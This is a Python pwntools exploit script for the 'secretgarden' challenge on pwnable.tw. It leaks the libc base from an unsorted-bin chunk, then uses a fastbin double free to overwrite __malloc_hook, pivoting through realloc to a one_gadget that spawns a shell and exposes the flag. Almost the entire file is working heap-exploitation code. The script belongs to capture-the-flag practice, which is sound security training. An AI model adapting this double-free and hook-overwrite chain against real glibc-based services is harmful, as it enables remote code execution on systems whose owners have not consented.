#!/usr/bin/env python3
from pwn import *

PORT = 10203
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./secretgarden_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000000C65
            brva 0x0000000000000E74
            brva 0x0000000000000F8B
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt):
    p.sendlineafter(pr, dt)

def sa(pr, dt):
    p.sendafter(pr, dt)

def menu(opt):
    sla(b'Your choice : ', str(opt).encode())

def _raise(sz, name, color):
    menu(1)
    sla(b'Length of the name :', str(sz).encode())
    sa(b'The name of flower :', name)
    sla(b'The color of the flower :', color)

def visit():
    menu(2)

def remove(idx):
    menu(3)
    sla(b'the garden:', str(idx).encode())

def clean():
    menu(4)

# Stage 1: Leak libc base via unsorted bin

_raise(0x500, b'd1nhdwc', b'red')
_raise(0x20, b'/bin/sh\0', b'blue')
remove(0)
_raise(0x10, b'B'*8, b'blue')
# GDB()
visit()
p.recvuntil(b'B'*8)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c3b78
log.info(f'libc_base: {hex(libc.address)}')


# Stage 2: Fastbin dup overwrite __malloc_hook -> realloc-> one_gadget

_raise(0x60, b'C'*0x50, b'red')
_raise(0x60, b'D'*0x50, b'blue')
remove(3)
remove(4)
remove(3)

_raise(0x60, p64(libc.sym.__malloc_hook - 0x23), b'yellow')
_raise(0x60, b'dump', b'dump')
_raise(0x60, b'dump', b'dump')

og = libc.address + 0xef6c4
pl = flat(
    b'A'*3,
    b'B'*8,
    og,
    libc.sym.realloc + 20
)
# GDB()

_raise(0x60, pl, b'white')
menu(1)

# cat /home/secretgarden/flag
p.interactive()

# d1nhdwc